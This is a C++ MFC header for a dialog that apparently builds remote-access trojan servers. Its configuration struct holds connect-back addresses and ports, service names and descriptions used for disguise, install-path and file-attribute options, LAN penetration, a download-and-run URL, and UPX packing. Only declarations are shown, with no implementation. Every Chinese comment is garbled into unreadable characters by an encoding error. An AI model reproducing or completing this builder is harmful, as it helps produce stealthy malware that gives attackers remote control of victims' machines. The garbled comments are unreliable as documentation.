#if !defined(AFX_BUILD_H__ACCDD992_A526_4D3B_A7BC_F325331462D9__INCLUDED_)
#define AFX_BUILD_H__ACCDD992_A526_4D3B_A7BC_F325331462D9__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// Build.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CBuild dialog

//������Ϣ�ṹ��
struct MODIFY_DATA
{
	TCHAR szDns1[300];      //���ߵ�ַ1
	TCHAR szDns2[300];      //���ߵ�ַ2
	DWORD dwPort1;          //���߶˿�1
	DWORD dwPort2;          //���߶˿�2
	TCHAR szGroup[50];      //���߷���
	TCHAR szVersion[32];    //���߰汾
	TCHAR SerName[100];     //��������
	TCHAR Serdisplay[128];  //��ʾ����
	TCHAR Serdesc[256];     //��������
	TCHAR szGetGroup[256];  //����Ψһ��ʶ
	BOOL  bLanPenetrate;    //�Ƿ�ʹ����������͸
	BOOL  bService;         //�Ƿ��Ƿ�������
	BOOL  bRuns;            //�Ƿ�������Ŀ¼����
	BOOL  bRunOnce;         //�Ƿ�Ϊ��ɫ��װ
	TCHAR ReleasePath[100]; //��װ;��
	TCHAR ReleaseName[50];  //��װ����
	WORD  Dele_zd;          //��װ����
	WORD  FileAttribute;    //�ļ�����
	BOOL Dele_Kzj;          //���߼�¼
	TCHAR szDownRun[512];   //�������е�ַ
};
class CBuild : public CDialog
{
// Construction
public:
	CBuild(CWnd* pParent = NULL);   // standard constructor
	void CompressUpx(CString inpath);

	virtual CString GetIPAddress();    //����IP��ȡ
	int ReplaceStr(char* sSrc, char* sMatchStr, char* sReplaceStr);
	void TestQQToIP(LPCSTR ch,UINT nPort);

// Dialog Data
	//{{AFX_DATA(CBuild)
	enum { IDD = IDD_BUILD };
//	CComboBox	m_FileSuffiex;
	CComboBox	m_FileAttribute;
	CButton	m_long_ipjm;
	CButton	m_Ftp_ip;
	CEdit	m_biaozhi;
	CComboBox	m_insatll_way;
	CEdit	m_svcname;
	CEdit	m_shelp;
	CEdit	m_scname;
	CEdit	m_version;
    CString	m_dns1;
    CString	m_dns2;
	CString	m_jmip;
	CString	m_Sjfz;
	CComboBox	m_online_group;
	BOOL	m_lanpenetrate;
	BOOL	m_green;
	CButton	m_testBtn;
	CButton	m_testBtn2;
	BOOL	m_upx;
	CComboBox	m_releasepath;
	CString	m_dllname;
	CString	m_remote_path;
	CEdit	m_log;
	DWORD	m_azzds;
	UINT	m_port1;
	UINT	m_port2;
	BOOL	m_kbcheck;
	CString	m_edit_kb;
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CBuild)
	public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
// ������ʾ

	// Generated message map functions
	//{{AFX_MSG(CBuild)
	virtual BOOL OnInitDialog();
	afx_msg void OnBuild();
	afx_msg void OnGreen();
	afx_msg void OnSelchangeInstallWay();
	afx_msg void OnTestMaster();
	afx_msg void OnTestMaster2();
	afx_msg void TestMaster();
	afx_msg void TestMaster2();
	afx_msg void OnUpx();
	afx_msg void OnRandom2();
	afx_msg void OnIPjm();
	afx_msg void OnSjfz();
	afx_msg void OnFtpIp();
	afx_msg void OnBtnPath();
	afx_msg void OnTest();
	afx_msg void OnKbCheck();
	afx_msg void OnKbTest();
	afx_msg HBRUSH OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor);

	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:
	HICON m_hIcon;
	bool m_bFirstShow;
	bool m_Servers;
	bool m_RunS;
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_BUILD_H__ACCDD992_A526_4D3B_A7BC_F325331462D9__INCLUDED_)
